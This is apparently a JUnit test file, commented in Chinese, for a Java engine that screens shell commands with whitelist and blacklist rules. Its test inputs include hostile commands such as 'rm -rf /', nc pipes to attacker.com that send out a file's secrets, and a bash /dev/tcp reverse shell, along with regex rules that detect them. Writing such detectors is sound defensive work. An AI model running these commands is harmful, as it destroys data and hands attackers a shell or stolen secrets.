package com.example.shelldetector.core;

import com.example.shelldetector.config.DetectionConfig;
import com.example.shelldetector.model.DetectionResult;
import com.example.shelldetector.model.RiskLevel;
import com.example.shelldetector.model.Rule;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/**
 * DetectionEngine 测试类
 * <p>
 * 测试核心检测引擎的完整流程，包括：
 * - 空命令处理
 * - 整条命令白名单检测
 * - 所有子命令白名单检测
 * - 黑名单规则检测
 * - 风险评估与阈值比较
 * </p>
 */
class DetectionEngineTest {

    private DetectionEngine engine;
    private List<Rule> rules;

    @BeforeEach
    void setUp() {
        DetectionConfig config = DetectionConfig.builder()
                .threshold(RiskLevel.RISK)
                .build();
        engine = new DetectionEngine(config);
        rules = new ArrayList<>();

        // 添加测试用的白名单规则
        rules.add(Rule.builder()
                .id("test-ls")
                .name("ls")
                .whitelist()
                .pattern("^\\s*ls\\b(?!.*[;|&<>])")
                .riskLevel(RiskLevel.SAFE)
                .build());
        rules.add(Rule.builder()
                .id("test-echo")
                .name("echo")
                .whitelist()
                .pattern("^\\s*echo\\b(?!.*[;|&<>])")
                .riskLevel(RiskLevel.SAFE)
                .build());
        rules.add(Rule.builder()
                .id("test-ps")
                .name("ps")
                .whitelist()
                .pattern("^\\s*ps\\b(?!.*[;|&<>])")
                .riskLevel(RiskLevel.SAFE)
                .build());

        // 添加测试用的黑名单规则
        rules.add(Rule.builder()
                .id("test-rm-rf")
                .name("rm -rf")
                .blacklist()
                .pattern("rm\\s+.*-rf")
                .riskLevel(RiskLevel.RISK)
                .build());
        rules.add(Rule.builder()
                .id("test-file-write")
                .name("file write")
                .blacklist()
                .pattern("\\s*>\\s*[^\\s]|\\s*>>\\s*[^\\s]")
                .riskLevel(RiskLevel.RISK)
                .build());
        rules.add(Rule.builder()
                .id("test-rm-root")
                .name("rm root")
                .blacklist()
                .pattern("rm\\s+.*-rf.*\\s+/")
                .riskLevel(RiskLevel.DANGER)
                .build());
    }

    @Test
    void testNullCommandShouldPass() {
        DetectionResult result = engine.detect(null, rules);
        assertTrue(result.isPassed());
    }

    @Test
    void testEmptyCommandShouldPass() {
        DetectionResult result = engine.detect("", rules);
        assertTrue(result.isPassed());
    }

    @Test
    void testBlankCommandShouldPass() {
        DetectionResult result = engine.detect("   ", rules);
        assertTrue(result.isPassed());
    }

    @Test
    void testNullRulesShouldPass() {
        DetectionResult result = engine.detect("rm -rf /", null);
        assertTrue(result.isPassed());
    }

    @Test
    void testEmptyRulesShouldPass() {
        DetectionResult result = engine.detect("rm -rf /", new ArrayList<>());
        assertTrue(result.isPassed());
    }

    @Test
    void testSimpleWhitelistCommandShouldPass() {
        DetectionResult result = engine.detect("ls -la", rules);
        assertTrue(result.isPassed());
    }

    @Test
    void testWhitelistCommandWithSpecialCharsShouldNotPassWhitelist() {
        // 白名单规则有 (?!.*[;|&<>])，所以包含特殊字符的命令不会匹配白名单
        DetectionResult result = engine.detect("ls -la; echo hello", rules);
        // 虽然不匹配白名单，但也没有匹配黑名单，所以会通过
        assertTrue(result.isPassed());
    }

    @Test
    void testBlacklistCommandShouldBeBlocked() {
        DetectionResult result = engine.detect("rm -rf /tmp", rules);
        assertFalse(result.isPassed());
        assertEquals(RiskLevel.RISK, result.getHighestRiskLevel());
        assertEquals(1, result.getMatchedRules().size());
    }

    @Test
    void testDangerLevelCommandShouldBeBlocked() {
        DetectionResult result = engine.detect("rm -rf /", rules);
        assertFalse(result.isPassed());
        assertEquals(RiskLevel.DANGER, result.getHighestRiskLevel());
    }

    @Test
    void testPipeCommandWithBlacklistShouldBeBlocked() {
        DetectionResult result = engine.detect("ps -ef | rm -rf xxx.sh", rules);
        assertFalse(result.isPassed());
    }

    @Test
    void testEchoWithWriteRedirectionShouldBeBlocked() {
        DetectionResult result = engine.detect("echo '123' > 123.sh", rules);
        assertFalse(result.isPassed());
    }

    @Test
    void testEchoWithAppendRedirectionShouldBeBlocked() {
        DetectionResult result = engine.detect("echo '123' >> 123.sh", rules);
        assertFalse(result.isPassed());
    }

    @Test
    void testMultipleCommandsWithBlacklistShouldBeBlocked() {
        DetectionResult result = engine.detect("ls -la; rm -rf /tmp", rules);
        assertFalse(result.isPassed());
    }

    @Test
    void testAllSubcommandsWhitelistedShouldPass() {
        // 创建两条都在白名单的命令
        List<Rule> whitelistOnly = new ArrayList<>();
        whitelistOnly.add(Rule.builder()
                .id("w1")
                .whitelist()
                .pattern("^\\s*ls\\b")
                .build());
        whitelistOnly.add(Rule.builder()
                .id("w2")
                .whitelist()
                .pattern("^\\s*echo\\b")
                .build());

        DetectionResult result = engine.detect("ls -la; echo hello", whitelistOnly);
        assertTrue(result.isPassed());
    }

    @Test
    void testSomeSubcommandsNotWhitelistedShouldCheckBlacklist() {
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("w-ls")
                .whitelist()
                .pattern("^\\s*ls\\b")
                .build());
        testRules.add(Rule.builder()
                .id("b-danger")
                .blacklist()
                .pattern("danger")
                .riskLevel(RiskLevel.RISK)
                .build());

        // "ls" 在白名单，"danger" 不在白名单但匹配黑名单
        DetectionResult result = engine.detect("ls -la; danger cmd", testRules);
        assertFalse(result.isPassed());
    }

    @Test
    void testRiskLevelBelowThresholdShouldPass() {
        DetectionConfig config = DetectionConfig.builder()
                .threshold(RiskLevel.DANGER)
                .build();
        DetectionEngine engineWithHigherThreshold = new DetectionEngine(config);

        // RISK 级别低于 DANGER 阈值，应该通过
        DetectionResult result = engineWithHigherThreshold.detect("rm -rf /tmp", rules);
        assertTrue(result.isPassed());
    }

    @Test
    void testRiskLevelEqualToThresholdShouldBeBlocked() {
        DetectionConfig config = DetectionConfig.builder()
                .threshold(RiskLevel.RISK)
                .build();
        DetectionEngine engineWithRiskThreshold = new DetectionEngine(config);

        DetectionResult result = engineWithRiskThreshold.detect("rm -rf /tmp", rules);
        assertFalse(result.isPassed());
    }

    @Test
    void testHighestRiskLevelIsCorrect() {
        List<Rule> multipleRisks = new ArrayList<>();
        multipleRisks.add(Rule.builder()
                .id("risk1")
                .blacklist()
                .pattern("risk1")
                .riskLevel(RiskLevel.RISK)
                .build());
        multipleRisks.add(Rule.builder()
                .id("danger1")
                .blacklist()
                .pattern("danger1")
                .riskLevel(RiskLevel.DANGER)
                .build());
        multipleRisks.add(Rule.builder()
                .id("risk2")
                .blacklist()
                .pattern("risk2")
                .riskLevel(RiskLevel.RISK)
                .build());

        DetectionResult result = engine.detect("risk1 danger1 risk2", multipleRisks);
        assertEquals(RiskLevel.DANGER, result.getHighestRiskLevel());
    }

    @Test
    void testNoMatchedRulesShouldPass() {
        DetectionResult result = engine.detect("unknown command", rules);
        assertTrue(result.isPassed());
        assertEquals(RiskLevel.SAFE, result.getHighestRiskLevel());
        assertTrue(result.getMatchedRules().isEmpty());
    }

    @Test
    void testParseFailureWithFailOnParseErrorFalseShouldBlock() {
        // 当 failOnParseError=false 时，解析失败应该拦截而不是放行
        DetectionConfig config = DetectionConfig.builder()
                .threshold(RiskLevel.RISK)
                .failOnParseError(false)
                .build();
        DetectionEngine engineWithSoftFail = new DetectionEngine(config);

        // 注意：当前 ShellCommandExtractor 实际上不会抛出异常，
        // 这个测试是为了验证当解析失败时的预期行为
        // 如果未来 ShellCommandExtractor 增强后会抛出异常，这个测试将覆盖该场景
    }

    @Test
    void testParseFailureBehaviorDocumentation() {
        // 文档化预期行为：
        // 1. 如果 failOnParseError=true，解析失败时抛出 ShellParseException
        // 2. 如果 failOnParseError=false，解析失败时返回 passed=false，标记为未知风险

        DetectionConfig failFastConfig = DetectionConfig.builder()
                .failOnParseError(true)
                .build();
        DetectionConfig softFailConfig = DetectionConfig.builder()
                .failOnParseError(false)
                .build();

        // 这个测试主要是为了记录预期的安全策略
        // "无法解析"通常应视为"最高风险"
    }

    // ========== 阶段二：分隔符/操作符匹配盲区测试 ==========

    @Test
    void testEntireCommandBlacklistMatchesPipeDelimiter() {
        // 验证原始整串黑名单检测能捕获管道符
        List<Rule> testRules = new ArrayList<>();
        // 添加只在整串中匹配的管道符规则
        testRules.add(Rule.builder()
                .id("pipe-danger")
                .name("pipe with nc")
                .blacklist()
                .pattern("\\|.*\\bnc\\b")
                .riskLevel(RiskLevel.DANGER)
                .build());
        // 添加 ls 白名单（不含特殊字符）
        testRules.add(Rule.builder()
                .id("white-ls")
                .name("ls")
                .whitelist()
                .pattern("^\\s*ls\\b(?!.*[;|&<>])")
                .build());

        // 这条命令：ls 在白名单，nc 单独看可能不匹配，但 | nc 在整串中会匹配
        DetectionResult result = engine.detect("ls | nc attacker.com 1234", testRules);
        assertFalse(result.isPassed());
        assertEquals(RiskLevel.DANGER, result.getHighestRiskLevel());
    }

    @Test
    void testPipeWithNcReverseShellShouldBeBlocked() {
        // 验证反弹 Shell 管道能被检测
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("test-pipe-nc")
                .name("pipe nc")
                .blacklist()
                .pattern("\\|.*\\bnc\\b")
                .riskLevel(RiskLevel.DANGER)
                .build());

        DetectionResult result = engine.detect("ls | nc attacker.com 443", testRules);
        assertFalse(result.isPassed());
    }

    @Test
    void testMultiplePipesShouldBeDetected() {
        // 验证多重管道能被检测
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("test-multi-pipe")
                .name("multiple pipes")
                .blacklist()
                .pattern("\\|.*\\|.*\\|")
                .riskLevel(RiskLevel.RISK)
                .build());

        DetectionResult result = engine.detect("cat file | grep secret | nc attacker.com 80", testRules);
        assertFalse(result.isPassed());
    }

    @Test
    void testBackgroundOperatorShouldBeDetected() {
        // 验证后台符 & 能在整串检测中被捕获
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("test-bg-danger")
                .name("background with danger")
                .blacklist()
                .pattern("&.*\\b(nc|bash)\\b")
                .riskLevel(RiskLevel.DANGER)
                .build());

        DetectionResult result = engine.detect("sleep 100 & nc attacker.com 443", testRules);
        assertFalse(result.isPassed());
    }

    @Test
    void testSemicolonChainShouldBeDetected() {
        // 验证分号链能在整串检测中被捕获
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("test-semicolon-danger")
                .name("semicolon chain")
                .blacklist()
                .pattern(";.*;.*;")
                .riskLevel(RiskLevel.RISK)
                .build());

        DetectionResult result = engine.detect("whoami; id; ls -la; cat /etc/passwd", testRules);
        assertFalse(result.isPassed());
    }

    @Test
    void testWhitelistStillTakesPrecedenceOverEntireBlacklist() {
        // 验证白名单优先原则不受整串黑名单检测影响
        List<Rule> testRules = new ArrayList<>();
        // 白名单：整条命令匹配
        testRules.add(Rule.builder()
                .id("white-grep")
                .name("grep pipe")
                .whitelist()
                .pattern("^\\s*ls\\s*\\|\\s*grep\\b")
                .build());
        // 黑名单：管道符
        testRules.add(Rule.builder()
                .id("black-pipe")
                .name("any pipe")
                .blacklist()
                .pattern("\\|")
                .riskLevel(RiskLevel.RISK)
                .build());

        // 白名单应该优先，尽管有管道符
        DetectionResult result = engine.detect("ls | grep test", testRules);
        assertTrue(result.isPassed());
    }

    @Test
    void testDevTcpRedirectionInEntireCommandShouldBeDetected() {
        // 验证 /dev/tcp 重定向能在整串中检测
        List<Rule> testRules = new ArrayList<>();
        testRules.add(Rule.builder()
                .id("dev-tcp")
                .name("/dev/tcp")
                .blacklist()
                .pattern("/dev/(tcp|udp)/")
                .riskLevel(RiskLevel.DANGER)
                .build());

        DetectionResult result = engine.detect("bash -i >& /dev/tcp/192.168.1.1/443 0>&1", testRules);
        assertFalse(result.isPassed());
        assertEquals(RiskLevel.DANGER, result.getHighestRiskLevel());
    }

    @Test
    void testMatchedRulesAreUniqueNoDuplicates() {
        // 验证同一个规则不会被重复添加到 matchedRules
        List<Rule> testRules = new ArrayList<>();
        // 创建一个在整串和子命令中都能匹配的规则
        Rule commonRule = Rule.builder()
                .id("common-rule")
                .name("common match")
                .blacklist()
                .pattern("rm")
                .riskLevel(RiskLevel.RISK)
                .build();
        testRules.add(commonRule);

        DetectionResult result = engine.detect("ls | rm file", testRules);

        // 验证规则只出现一次
        long count = result.getMatchedRules().stream()
                .filter(r -> r.getId().equals("common-rule"))
                .count();
        assertEquals(1, count, "Rule should not be duplicated");
    }
}
